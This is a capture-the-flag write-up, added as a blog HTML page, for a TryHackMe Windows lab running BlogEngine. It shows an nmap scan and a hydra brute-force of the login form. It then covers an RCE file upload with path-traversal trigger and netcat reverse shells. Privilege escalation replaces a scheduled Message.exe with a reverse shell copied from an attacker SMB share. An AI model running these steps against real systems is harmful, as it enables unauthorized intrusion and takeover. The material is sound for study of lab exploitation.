@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="HackPackDifficulty: EazyScore: 3&#x2F;10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM HackPack">
+<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack%20[5].html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="HackPackDifficulty: EazyScore: 3&#x2F;10">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu4l1MVGVmM8ZzldB9hzNaGAMcrr.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqkORhTI5rljJY66-a1oorg7OJIT.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlHZPMUB3Lem2yTJ6STrapZGZpgF.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmsYzteYATionr4kSmBMAn76oRLw.png">
+<meta property="article:published_time" content="2022-01-22T23:18:00.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:13.290Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="Penetration Test">
+<meta property="article:tag" content="Try Hack Me">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu4l1MVGVmM8ZzldB9hzNaGAMcrr.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>THM HackPack</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/Virtual%20Attack%20%5B7%5D.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%20%5B6%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[5].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&text=THM HackPack"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&title=THM HackPack"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&is_video=false&description=THM HackPack"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=THM HackPack&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[5].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&title=THM HackPack"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&title=THM HackPack"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&title=THM HackPack"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&title=THM HackPack"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&name=THM HackPack&description=&lt;h1 id=&#34;HackPack&#34;&gt;&lt;a href=&#34;#HackPack&#34; class=&#34;headerlink&#34; title=&#34;HackPack&#34;&gt;&lt;/a&gt;HackPack&lt;/h1&gt;&lt;p&gt;Difficulty: Eazy&lt;br&gt;Score: 3&amp;#x2F;10&lt;/p&gt;
+&lt;hr&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[5].html&t=THM HackPack"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HackPack"><span class="toc-number">1.</span> <span class="toc-text">HackPack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">2.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">3.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">3.1.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Running-nmap"><span class="toc-number">3.1.1.</span> <span class="toc-text">Running nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.2.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">3.3.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        THM HackPack
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-22T23:18:00.000Z" class="dt-published" itemprop="datePublished">2022-01-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Penetration-Test/">Penetration Test</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Penetration-Test/" rel="tag">Penetration Test</a>, <a class="p-category" href="/tags/Try-Hack-Me/" rel="tag">Try Hack Me</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="HackPack"><a href="#HackPack" class="headerlink" title="HackPack"></a>HackPack</h1><p>Difficulty: Eazy<br>Score: 3&#x2F;10</p>
+<hr>
+<span id="more"></span>
+
+<h1 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h1><ol>
+<li>2 flags</li>
+<li>system privilege</li>
+</ol>
+<h1 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Running-nmap"><a href="#Running-nmap" class="headerlink" title="Running nmap"></a>Running nmap</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-o</span> nmap.txt <span class="token parameter variable">-Pn</span> <span class="token number">10.10</span>.45.21
+  PORT     STATE SERVICE            VERSION
+  <span class="token number">80</span>/tcp   <span class="token function">open</span>  http               Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+  <span class="token operator">|</span> http-methods:
+  <span class="token operator">|</span>_  Potentially risky methods: TRACE
+  <span class="token operator">|</span> http-robots.txt: <span class="token number">6</span> disallowed entries
+  <span class="token operator">|</span> /Account/*.* /search /search.aspx /error404.aspx
+  <span class="token operator">|</span>_/archive /archive.aspx
+  <span class="token operator">|</span>_http-server-header: Microsoft-IIS/8.5
+  <span class="token operator">|</span>_http-title: hackpark <span class="token operator">|</span> hackpark amusements
+  <span class="token number">3389</span>/tcp <span class="token function">open</span>  ssl/ms-wbt-server?
+  <span class="token operator">|</span>_ssl-date: <span class="token number">2020</span>-07-29T16:16:07+00:00<span class="token punctuation">;</span> +1s from scanner time.
+  Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>We see that port 80 is open, checking it we see a picture of <strong>pennywise</strong>:<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu4l1MVGVmM8ZzldB9hzNaGAMcrr.png"><br>Going through the menu , a login page is found running <a target="_blank" rel="noopener" href="http://blogengine.net/">blogengine.net</a><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqkORhTI5rljJY66-a1oorg7OJIT.png"><br>In order to login we are going to bruteforce with hydra, using admin as user<br>We can also brute-force with brupsuite</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-P</span> /usr/share/wordlists/rockyou.txt <span class="token number">10.10</span>.79.241  http-post-form <span class="token string">"/Account/login.aspx:__VIEWSTATE=ScTUsDEL61RxXQbUkxPIvjWwWIPtRoGua7VlvlhkXMv83IlH8nDZNBJap5qDDRHYpohgQkDHiy%2FBC%2BxgOpa%2BQyclcuurGR6oEQrtrgMMab51BRVITHbw51etTYHg%2BOSqlTEdhO1sq6LyFJ6OiiTP6d9DJf02wqbnAd2tPNuj2XvUivov&amp;__EVENTVALIDATION=IwDYcG9QBNf8p2xPKx%2B%2Fw5JxMDpBvm8H7wN1ksA5dw9A8UBpnwOCo0Dw%2BPk5zNJmkB9lQ%2FliisMfMuMuK0XXTqgvEqLeivDFKIVc5TL58r9bwhfN6No%2FVNcCXAAYsaZZOdkMyqjZVNaOltsfMh1u4e0p9aFSTmWecZYwxusByDyG%2FSae&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"</span> <span class="token parameter variable">-t</span> <span class="token number">64</span>
+ <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">[</span>http-post-form<span class="token punctuation">]</span> host: <span class="token number">10.10</span>.79.241   login: admin   password: ******
+ <span class="token number">1</span> of <span class="token number">1</span> target successfully completed, <span class="token number">1</span> valid password found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>With the credentials obtained (according to writeup rules the password can´t be shown) we access to the CMS and see that the machine is running Blogengine version 3.3.6<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlHZPMUB3Lem2yTJ6STrapZGZpgF.png"></p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Doing a quick search for exploits, I found the following RCE vulnerability : <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46353">https://www.exploit-db.com/exploits/46353</a><br>In order to obtain a reverse shell, we need to copy that code to a file name PostView.ascx, then browsing to <a target="_blank" rel="noopener" href="http://ip/admin/app/editor/editpost.cshtml">http://IP/admin/app/editor/editpost.cshtml</a> to upload the file<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmsYzteYATionr4kSmBMAn76oRLw.png"><br>To trigger the reverse shell we need to browse to <a target="_blank" rel="noopener" href="http://ip/?theme=../../App_Data/files">http://IP/?theme=../../App_Data&#x2F;files</a><br>Checking netcat , we obtain a reverse connection</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">443</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">443</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">10.11</span>.14.106<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.79.241<span class="token punctuation">]</span> <span class="token number">49326</span>
+Microsoft Windows <span class="token punctuation">[</span>Version <span class="token number">6.3</span>.9600<span class="token punctuation">]</span>
+<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2013</span> Microsoft Corporation. All rights reserved
+c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>inetsrv<span class="token operator">></span>whoami
+iis apppool<span class="token punctuation">\</span>blog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>For this part we are going to use an enumeration tool called WinPEAS : <a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a><br>Transfer the binary file with Netcat or python<br>After reading all colored output of winPEAS , I found this uncommon binary</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WindowsScheduler<span class="token punctuation">(</span>Splinterware Software Solutions - System Scheduler Service<span class="token punctuation">)</span><span class="token punctuation">[</span>C:<span class="token punctuation">\</span>PROGRA~2<span class="token punctuation">\</span>SYSTEM~1<span class="token punctuation">\</span>WService.exe<span class="token punctuation">]</span> - Auto - Running
+Possible DLL Hijacking <span class="token keyword">in</span> binary folder: C:<span class="token punctuation">\</span>Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span><span class="token punctuation">\</span>SystemScheduler <span class="token punctuation">(</span>Everyone <span class="token punctuation">[</span>WriteData/CreateFiles<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Going to that directory, we found the following log file:</p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">08/07/20 04:06:34,Process Ended. PID:480,ExitCode:4,Message.exe (Administrator)
+08/07/20 04:07:02,Event Started Ok, (Administrator)
+08/07/20 04:07:33,Process Ended. PID:2420,ExitCode:4,Message.exe (Administrator)
+08/07/20 04:08:02,Event Started Ok, (Administrator)
+08/07/20 04:08:33,Process Ended. PID:800,ExitCode:4,Message.exe (Administrator)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>it will execute the Message.exe automacally per 30 sec<br>Transfer the shell to victim machine<br>We first rename Message.exe and then upload our reverse shell</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Program Files (x86)\SystemScheduler&gt;ren Message.exe Message.exe.bak
+C:\Program Files (x86)\SystemScheduler&gt;copy \\10.11.14.106\smbfolder\Message.exe
+        1 file(s) copied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Finally, after a few seconds we obtain a reverse connection as Administrator</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">8888</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">10.11</span>.14.106<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.79.241<span class="token punctuation">]</span> <span class="token number">49517</span>
+Microsoft Windows <span class="token punctuation">[</span>Version <span class="token number">6.3</span>.9600<span class="token punctuation">]</span>
+<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2013</span> Microsoft Corporation. All rights reserved.
+C:<span class="token punctuation">\</span><span class="token operator">></span>whoami
+hackpark<span class="token punctuation">\</span>administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HackPack"><span class="toc-number">1.</span> <span class="toc-text">HackPack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">2.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">3.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">3.1.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Running-nmap"><span class="toc-number">3.1.1.</span> <span class="toc-text">Running nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.2.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">3.3.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[5].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&text=THM HackPack"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&title=THM HackPack"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&is_video=false&description=THM HackPack"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=THM HackPack&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[5].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&title=THM HackPack"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&title=THM HackPack"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&title=THM HackPack"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&title=THM HackPack"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[5].html&name=THM HackPack&description=&lt;h1 id=&#34;HackPack&#34;&gt;&lt;a href=&#34;#HackPack&#34; class=&#34;headerlink&#34; title=&#34;HackPack&#34;&gt;&lt;/a&gt;HackPack&lt;/h1&gt;&lt;p&gt;Difficulty: Eazy&lt;br&gt;Score: 3&amp;#x2F;10&lt;/p&gt;
+&lt;hr&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[5].html&t=THM HackPack"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
